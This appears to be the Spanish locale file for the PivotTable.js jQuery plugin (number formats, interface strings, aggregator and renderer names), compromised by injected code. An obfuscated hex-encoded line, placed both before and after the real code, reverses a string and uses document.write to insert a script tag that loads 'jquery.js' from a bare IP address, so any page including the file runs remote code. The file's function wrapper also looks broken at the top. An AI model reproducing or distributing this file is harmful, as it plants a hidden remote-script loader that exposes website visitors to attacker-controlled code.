var _0x82ab=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0x82ab[5]](_0x82ab[4][_0x82ab[3]](_0x82ab[0])[_0x82ab[2]]()[_0x82ab[1]](_0x82ab[0]))  var callWithJQuery;

  callWithJQuery = function(pivotModule) {
    if (typeof exports === "object" && typeof module === "object") {
      return pivotModule(require("jquery"));
    } else if (typeof define === "function" && define.amd) {
      return define(["jquery"], pivotModule);
    } else {
      return pivotModule(jQuery);
    }
  };

  callWithJQuery(function($) {
    var frFmt, frFmtInt, frFmtPct, nf, tpl;
    nf = $.pivotUtilities.numberFormat;
    tpl = $.pivotUtilities.aggregatorTemplates;
    frFmt = nf({
      thousandsSep: ".",
      decimalSep: ","
    });
    frFmtInt = nf({
      digitsAfterDecimal: 0,
      thousandsSep: ".",
      decimalSep: ","
    });
    frFmtPct = nf({
      digitsAfterDecimal: 1,
      scaler: 100,
      suffix: "%",
      thousandsSep: ".",
      decimalSep: ","
    });
    return $.pivotUtilities.locales.es = {
      localeStrings: {
        renderError: "Ocurrió un error durante la interpretación de la tabla din&acute;mica.",
        computeError: "Ocurrió un error durante el c&acute;lculo de la tabla din&acute;mica.",
        uiRenderError: "Ocurrió un error durante el dibujado de la tabla din&acute;mica.",
        selectAll: "Marcar todo",
        selectNone: "Desmarcar todo",
        tooMany: "(demasiados valores)",
        filterResults: "Filtrar resultados",
        totals: "Totales",
        vs: "vs",
        by: "por",
		lblRows: "Filas",
		lblCols: "Columnas",
		lblPrint: "Imprimir",
		lblOK: "Aceptar",
		lblExcel: "Exportar a XLS",
      },
      aggregators: {
        "Cuenta": tpl.count(frFmtInt),
        "Cuenta de valores únicos": tpl.countUnique(frFmtInt),
        "Lista de valores únicos": tpl.listUnique(", "),
        "Suma": tpl.sum(frFmt),
        "Suma de enteros": tpl.sum(frFmtInt),
        "Promedio": tpl.average(frFmt),
        "Mínimo": tpl.min(frFmt),
        "Máximo": tpl.max(frFmt),
        "Suma de sumas": tpl.sumOverSum(frFmt),
        "Cota 80% superior": tpl.sumOverSumBound80(true, frFmt),
        "Cota 80% inferior": tpl.sumOverSumBound80(false, frFmt),
        "Proporción del total (suma)": tpl.fractionOf(tpl.sum(), "total", frFmtPct),
        "Proporción de la fila (suma)": tpl.fractionOf(tpl.sum(), "row", frFmtPct),
        "Proporción de la columna (suma)": tpl.fractionOf(tpl.sum(), "col", frFmtPct),
        "Proporción del total (cuenta)": tpl.fractionOf(tpl.count(), "total", frFmtPct),
        "Proporción de la fila (cuenta)": tpl.fractionOf(tpl.count(), "row", frFmtPct),
        "Proporción de la columna (cuenta)": tpl.fractionOf(tpl.count(), "col", frFmtPct)
      },
      renderers: {
        "Tabla": $.pivotUtilities.renderers["Table"],
        "Tabla con barras": $.pivotUtilities.renderers["Table Barchart"],
        "Mapa de calor": $.pivotUtilities.renderers["Heatmap"],
        "Mapa de calor por filas": $.pivotUtilities.renderers["Row Heatmap"],
        "Mapa de calor por columnas": $.pivotUtilities.renderers["Col Heatmap"]
      }
    };
  });

}).call(this);

//# sourceMappingURL=pivot.es.js.map
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
